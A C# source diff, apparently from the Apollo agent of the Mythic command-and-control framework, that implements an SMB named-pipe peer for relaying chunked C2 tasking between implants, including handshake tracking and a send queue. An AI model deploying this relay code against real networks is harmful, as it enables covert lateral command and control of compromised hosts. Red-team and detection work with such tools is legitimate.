@@ -1,43 +1,147 @@
-﻿using ApolloInterop.Interfaces;
+﻿using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Serializers;
 using ApolloInterop.Structs.MythicStructs;
 using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
+using System.IO.Pipes;
 using System.Linq;
 using System.Text;
 using AI = ApolloInterop;
+using ApolloInterop.Constants;
+using AS = ApolloInterop.Structs.ApolloStructs;
+using System.Threading;
+using TTasks = System.Threading.Tasks;
+using ApolloInterop.Enums.ApolloEnums;
 
 namespace Apollo.Peers.SMB
 {
-    public class SMBPeer : AI.Classes.Peer
+    public class SMBPeer : AI.Classes.Peer, INamedPipeCallback
     {
-        public SMBPeer(IAgent agent, IC2Profile c2) : base(agent, c2)
+        private AsyncNamedPipeClient _pipeClient = null;
+        private PipeStream _pipe = null;
+        private bool _expectEKE;
+        private ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
+        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
+        private Action<object> _sendAction;
+        private TTasks.Task _sendTask;
+        private MessageType _serverResponseType;
+        public SMBPeer(IAgent agent, C2ProfileData c2) : base(agent, c2)
         {
+            _pipeClient = new AsyncNamedPipeClient(c2.Parameters["hostname"], c2.Parameters["pipename"], this);
+            _expectEKE = c2.Parameters["encrypted_exchange_check"] == "T";
 
+            _sendAction = (object p) =>
+            {
+                while (((PipeStream)p).IsConnected)
+                {
+                    if (_senderQueue.TryDequeue(out byte[] result))
+                    {
+                        ((PipeStream)p).BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
+                    }
+                    else
+                    {
+                        Thread.Sleep(1000);
+                    }
+                }
+            };
         }
 
-        public override string Connected()
+        public void OnAsyncMessageSent(IAsyncResult result)
         {
-            throw new NotImplementedException();
+            PipeStream pipe = (PipeStream)result.AsyncState;
+            pipe.EndWrite(result);
+            // Potentially delete this since theoretically the sender Task does everything
+            if (_senderQueue.TryDequeue(out byte[] data))
+            {
+                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
+            }
+        }
+
+        public override bool Connected()
+        {
+            return _pipe.IsConnected;
         }
 
         public override bool Finished()
         {
-            throw new NotImplementedException();
+            return _previouslyConnected && !_pipe.IsConnected;
         }
 
-        public override string ProcessMessage(DelegateMessage message)
+        public void OnAsyncConnect(PipeStream pipe, out object state)
         {
-            throw new NotImplementedException();
+            _pipe = pipe;
+            _sendTask = new TTasks.Task(_sendAction, pipe);
+            _sendTask.Start();
+            _previouslyConnected = true;
+            state = this;
         }
 
-        public override void Start()
+        public void OnAsyncDisconnect(PipeStream pipe, object state)
         {
-            throw new NotImplementedException();
+            pipe.Close();
+            _sendTask.Wait();
+        }
+
+        public void OnAsyncMessageReceived(PipeStream pipe, AS.IPCData data, object state)
+        {
+            AS.IPCChunkedData chunkedData = _serializer.Deserialize<AS.IPCChunkedData>(
+                Encoding.UTF8.GetString(
+                    data.Data.Take(data.DataLength).ToArray()
+                )
+            );
+            lock(_messageOrganizer)
+            {
+                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
+                {
+                    _messageOrganizer[chunkedData.ID] = new IPCMessageStore(DeserializeToReceiver);
+                }
+            }
+            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
+        }
+
+        public bool DeserializeToReceiver(byte[] data, MessageType mt)
+        {
+            // Probably where we do sorting based on EKE,
+            // checkin, and get_tasking
+            switch(mt)
+            {
+                // part of the checkin process, flag next message to be of EKE
+                case MessageType.EKEHandshakeMessage:
+                    _serverResponseType = MessageType.EKEHandshakeResponse;
+                    break;
+                default:
+                    _serverResponseType = MessageType.MessageResponse;
+                    break;
+            }
+            _agent.GetTaskManager().AddDelegateMessageToQueue(new DelegateMessage()
+            {
+                UUID = _uuid,
+                Message = Encoding.UTF8.GetString(data)
+            });
+            return true;
+        }
+
+        public override void ProcessMessage(DelegateMessage message)
+        {
+            _mythicUUID = message.MythicUUID;
+            AS.IPCChunkedData[] chunks = _serializer.SerializeDelegateMessage(message.Message, _serverResponseType);
+            foreach(AS.IPCChunkedData chunk in chunks)
+            {
+                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
+            }
+        }
+
+        public override bool Start()
+        {
+            return _pipeClient.Connect(10000);
         }
 
         public override void Stop()
         {
-            throw new NotImplementedException();
+            _pipe.Close();
+            _sendTask.Wait();
         }
     }
 }
